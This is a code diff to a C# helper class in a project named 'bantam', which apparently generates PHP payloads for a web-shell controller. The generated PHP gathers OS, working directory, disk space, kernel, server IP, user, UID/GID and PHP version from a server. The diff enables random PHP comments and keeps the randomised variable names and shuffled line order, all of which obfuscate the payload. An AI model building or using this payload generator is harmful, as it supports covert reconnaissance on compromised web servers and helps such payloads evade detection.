@@ -1,29 +1,10 @@
 ﻿using System.Collections.Generic;
+using System.Text;
 
 namespace bantam.Classes
 {
     class PhpHelper
     {
-        /// <summary>
-        /// 
-        /// </summary>
-        public enum INIT_DATA_VARS
-        {
-            OS = 0,
-            CWD,
-            FREE_SPACE,
-            TOTAL_SPACE,
-            RELEASE,
-            KERNEL,
-            SERVER_IP,
-            SERVER_SOFTWARE,
-            USER,
-            UID,
-            GID,
-            GROUP,
-            PHP_VERSION
-        }
-
         /// <summary>
         /// 
         /// </summary>
@@ -84,8 +65,6 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string RandomPHPComment(int maxNum = 32)
         {
-            return "";   
-            //check global cfg check "" if off, and have a slider for amount of comments, and a slider for length of comments
             int length = Helper.RandomNumber(maxNum);
             return "/*" + Helper.RandomString(length, true, true) + "*/";
         }
@@ -176,10 +155,10 @@ namespace bantam.Classes
             string phpVersionVar = RandomPHPVar();
 
             string responseCode = string.Empty;
-            string linesRandomized = string.Empty;
+            StringBuilder sb = new StringBuilder();
 
             //order of these lines don't matter so we shuffle them around
-            List<string> lines = new List<string> {
+            List<string> shuffleableLines = new List<string> {
                 osVar + " = 'nix'; if (strtolower(substr(PHP_OS, 0, 3)) == 'win'){ " + osVar + " = 'win';}",
 
                 cwdVar + (" = dirname(__FILE__);" + freespaceVar + " = @diskfreespace(" + cwdVar + ");"
@@ -193,11 +172,10 @@ namespace bantam.Classes
                 serverSoftwareVar + " = @getenv('SERVER_SOFTWARE');",
             };
 
-            Helper.ShuffleList(lines);
+            Helper.ShuffleList(shuffleableLines);
 
-            foreach (var line in lines) {
-                linesRandomized += line;
-                linesRandomized += RandomPHPComment();
+            foreach (var line in shuffleableLines) {
+                sb.Append(line + RandomPHPComment());
             }
 
             if (encryptResponse) {
@@ -220,7 +198,7 @@ namespace bantam.Classes
                      + "'." + groupVar + ".'" + g_delimiter
                      + "'." + phpVersionVar + ";";
 
-            return linesRandomized 
+            return sb
                 + "if (!function_exists('posix_getegid')) {" + RandomPHPComment()
                 + userVar + " = @get_current_user();" + RandomPHPComment()
                 + uidVar + " = @getmyuid();" + RandomPHPComment()
